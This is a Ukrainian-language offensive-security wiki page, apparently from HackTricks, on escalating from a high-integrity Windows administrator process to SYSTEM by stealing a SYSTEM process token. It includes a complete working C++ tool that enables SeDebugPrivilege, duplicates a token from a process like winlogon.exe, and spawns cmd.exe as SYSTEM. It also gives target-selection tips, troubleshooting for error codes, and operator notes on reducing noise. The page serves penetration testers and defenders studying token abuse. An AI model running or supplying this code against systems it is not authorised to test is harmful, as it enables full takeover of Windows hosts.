# SeImpersonate від High до System

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка описує **ручний** спосіб переходу від **процесу адміністратора з високим рівнем цілісності** до **`NT AUTHORITY\SYSTEM`** шляхом **відкриття незахищеного процесу SYSTEM, дублювання його токена та запуску дочірнього процесу з цим токеном**.

Якщо у вас є лише **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**, але ви **не можете відкрити відповідний процес SYSTEM**, шлях **Potato / named-pipe** зазвичай є надійнішим:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Якщо вам потрібен не лише `SYSTEM`, а **токен SYSTEM із якомога більшою кількістю привілеїв**, також перегляньте:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Швидка перевірка

Перш ніж намагатися викрасти токен, швидко перевірте контекст:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Практичні нотатки:

- Токена адміністратора з **High Integrity** зазвичай достатньо, щоб **увімкнути `SeDebugPrivilege`** і відкрити багато незахищених процесів SYSTEM.
- **`CreateProcessWithTokenW` вимагає `SeImpersonatePrivilege`** у caller. Якщо цей API повертає помилку `1314`, після дублювання primary token SYSTEM переключіться на `CreateProcessAsUserW`.
- У сучасних версіях Windows **`lsass.exe` часто є невдалою ціллю**, оскільки **LSA protection / PPL** блокує доступ навіть адміністраторам із `SeDebugPrivilege`. Надавайте перевагу **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** або ранньому **`svchost.exe`**, що працює як SYSTEM.
- Не кожен процес SYSTEM має однаково корисний токен. Якщо ви отримали SYSTEM, але помітили відсутні privileges, спробуйте інший процес SYSTEM замість того, щоб вважати, що техніка не працює.

## Ретельно вибирайте PID

Найпростіший спосіб забезпечити стабільну роботу — **вибрати процес SYSTEM, чий DACL фактично дозволяє Administrators опитувати процес і дублювати його токен**.

Спочатку перевірте такі хороші кандидати:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- деякі ранні екземпляри `svchost.exe`, що працюють як SYSTEM

Типово уникайте:

- `lsass.exe` на хостах, де ввімкнено **RunAsPPL / LSA protection**
- захищених / чутливих до безпеки процесів, які повертають `Access denied` навіть після ввімкнення `SeDebugPrivilege`

Переглянути процеси-кандидати та їхні token/ACL можна за допомогою **Process Explorer** або **Process Hacker**, запущених із підвищеними privileges.

### Код

Наведений нижче код взято [звідси](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Він дозволяє **вказати Process ID як аргумент**, після чого буде запущено CMD, **що працює від імені користувача** вказаного процесу.<sup>[[3]](#references)</sup>\
У процесі з High Integrity можна **вказати PID процесу, що працює як System** (наприклад, `winlogon`, `wininit`) і виконати `cmd.exe` як SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Корисні нотатки щодо API / прав доступу

У прикладі використовується `MAXIMUM_ALLOWED`, але для реальних операцій корисно пам’ятати про мінімально необхідні компоненти:

- `OpenProcessToken()` вимагає лише, щоб **дескриптор процесу** було відкрито з правом **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Для використання `CreateProcessWithTokenW()` **дескриптор primary token** повинен мати права **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` має створити **primary token** (`TokenPrimary`), а не лише impersonation token.
- Якщо ви вже виконали impersonation SYSTEM, але `CreateProcessWithTokenW()` усе ще завершується помилкою `1314`, спробуйте натомість `CreateProcessAsUserW()`.

Це означає, що **відкриття цільового процесу з `PROCESS_ALL_ACCESS` зазвичай непотрібне й створює більше шуму**, ніж простий запит прав, необхідних для отримання token.

## Помилка

Іноді ви можете спробувати виконати impersonation System, але це не спрацює, і ви побачите приблизно такий вивід:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Це означає, що навіть якщо ви працюєте з рівнем **High Integrity**, у вас **недостатньо дозволів** щодо цільового процесу/токена.\
Перевіримо поточні дозволи Administrator щодо процесів `svchost.exe` за допомогою **Process Explorer** (також можна використати **Process Hacker**):

1. Виберіть процес `svchost.exe`
2. Клацніть правою кнопкою миші --> Properties
3. На вкладці "Security" у нижньому правому куті натисніть кнопку "Permissions"
4. Натисніть "Advanced"
5. Виберіть "Administrators" і натисніть "Edit"
6. Натисніть "Show advanced permissions"

![Code - Помилка: 6. Натисніть "Show advanced permissions"](<../../images/image (437).png>)

На попередньому зображенні наведено всі привілеї, які "Administrators" мають щодо вибраного процесу (як видно, у випадку `svchost.exe` вони мають лише привілеї "Query")

Перегляньте привілеї, які "Administrators" мають щодо `winlogon.exe`:

![Code - Помилка: Перегляньте привілеї, які "Administrators" мають щодо winlogon.exe](<../../images/image (1102).png>)

У цьому процесі "Administrators" можуть виконувати "Read Memory" і "Read Permissions", що, ймовірно, дозволяє Administrators імперсонувати токен, який використовує цей процес.

### Поширені причини помилок

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: DACL процесу блокує доступ, або цільовий процес є **protected/PPL**. Виберіть інший SYSTEM процес.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: handle вашого токена відкрито без достатніх прав, або DACL цільового токена забороняє дублювання.
- **`CreateProcessWithTokenW()` -> `1314`**: у caller наразі не увімкнено **`SeImpersonatePrivilege`**. Спочатку спробуйте увімкнути його або використайте `CreateProcessAsUserW()` з дубльованим primary token.
- **`CreateProcessWithTokenW()` -> `1326`** після попередніх невдалих спроб: це часто просто означає, що попередній крок дублювання/імперсонації токена завершився невдало, тому немає придатного primary token для запуску дочірнього процесу.

## Нотатки оператора

- Ця техніка чудово підходить, коли ви вже маєте права **local admin + high integrity** і просто хочете швидко та вручну отримати SYSTEM, не запускаючи service і не створюючи ланцюжок coercion через named pipe.
- У зміцнених середовищах Windows 11 / Server **LSA protection** стає дедалі поширенішим, тому workflow, який передбачає, що `lsass.exe` завжди доступний для читання, є ненадійним. **`winlogon.exe` / `wininit.exe` / `services.exe` зазвичай є кращими першими цілями**.<sup>[[2]](#references)</sup>
- Якщо ви опинилися в контексті **service account**, а не на підвищеному робочому столі адміністратора, **Potato family** зазвичай підходить краще, ніж описаний на цій сторінці метод.



## Посилання

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Зловживання Windows-токенами для компрометації Active Directory без взаємодії з LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Розуміння токенів процесів та зловживання ними — частина II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)

{{#include ../../banners/hacktricks-training.md}}
